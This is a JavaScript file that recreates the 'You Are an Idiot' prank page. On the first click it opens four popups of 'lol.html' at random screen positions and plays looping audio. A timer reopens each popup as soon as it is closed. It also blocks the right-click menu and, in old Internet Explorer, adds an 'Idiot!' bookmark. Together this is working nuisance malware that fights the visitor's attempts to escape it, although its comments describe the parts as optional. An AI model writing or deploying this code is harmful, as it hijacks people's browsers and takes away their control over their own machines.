/* Optional audio setup */
document.addEventListener('click', musicPlay);

function musicPlay() {
    var audio = document.getElementById('youare-audio');
    var micon = document.getElementById('youare-micon');

    if (audio && micon) {
        if (audio.duration > 0 && audio.paused) {
            audio.play();
            micon.src = "images/speaker.png";
        } else {
            audio.pause();
            audio.currentTime = 0;
            micon.src = "images/speakerm.png";
        }
    }

    openInitialTabs();
    document.removeEventListener('click', musicPlay);
}

/* Looping background audio */
var faudio = new Audio('youare.mp3');

faudio.addEventListener('timeupdate', function () {
    if (this.currentTime > this.duration - 0.45) {
        this.currentTime = 0;
        this.play();
    }
});

/* Popup tracking */
let popups = [];

/* Open popup window */
function openWindow(x, y) {
    const width = 357;
    const height = 330;

    const win = window.open(
        "lol.html",
        "_blank",
        `menubar=no,status=no,toolbar=no,resizable=yes,
        width=${width},height=${height},
        left=${x},top=${y}`
    );

    trackPopup(win);
    return win;
}

/* Track and respawn on close */
function trackPopup(win) {
    const checker = setInterval(() => {
        if (!win || win.closed) {
            clearInterval(checker);
            spawnOnePopup();
        }
    }, 1000);
}

/* Spawn one popup at random position */
function spawnOnePopup() {
    const width = 357;
    const height = 330;

    let x = Math.random() * (screen.width - width);
    let y = Math.random() * (screen.height - height);

    openWindow(x, y);
}

/* Initial 4 popups */
function openInitialTabs() {
    for (let i = 0; i < 4; i++) {
        spawnOnePopup();
    }
}

/* Optional title changer */
function changeTitle(title) {
    document.title = title;
}

/* Optional bookmark function */
function bookmark() {
    if (
        navigator.appName == "Microsoft Internet Explorer" &&
        parseInt(navigator.appVersion) >= 4
    ) {
        window.external.AddFavorite("lol.html", "Idiot!");
    }
}

/* Disable right click (optional) */
window.oncontextmenu = function () {
    return false;
};

/* Startup */
window.onload = function () {
    bookmark();
};